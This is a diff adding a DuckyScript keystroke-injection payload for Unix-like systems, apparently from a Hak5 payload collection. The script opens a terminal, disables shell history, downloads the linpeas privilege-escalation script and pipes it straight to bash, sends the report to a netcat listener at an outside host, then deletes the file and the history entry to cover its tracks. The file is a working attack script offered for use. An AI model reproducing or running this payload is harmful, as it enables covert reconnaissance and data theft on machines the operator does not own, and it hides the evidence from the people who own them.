@@ -1,0 +1,24 @@
+REM Title: Linpeas netcat exfil
+REM Author: FalsePhilosopher
+REM Target:  Unix-like tested on kubuntu 22.04
+REM Props: Hak5, 0iphor13 for pointing me towards netcat an other advice, strippers and memes
+REM Version: 1.0
+REM Category: Recon
+REM Launches terminal, turns off history, launches linpeas, uploads the report to your nc listener, covers tracks and exits. Best viewing of report is to view it in the terminal.
+REM
+REM initialization delay
+DELAY 300
+REM Minimize all windows as that ensures launch happens smoother.
+WINDOWS d
+DELAY 300
+CTRL-ALT t
+DELAY 1500
+REM sneak +1 don't delete the whole history or mess with settings, just turn history off and delete the history command entry ;)
+STRING set +o history
+DELAY 300
+ENTER
+REM launch recon and exfil then cover your tracks
+STRING nohup curl -s -L https://github.com/carlospolop/PEASS-ng/releases/download/20220703/linpeas.sh | bash >treasure.txt && nc receiving.host.com 5555 < treasure.txt && rm treasure.txt && history | grep history && line=$(history | grep history | awk '{ print $1 }') && history -d $line && set -o history && exit
+DELAY 300
+ENTER
+
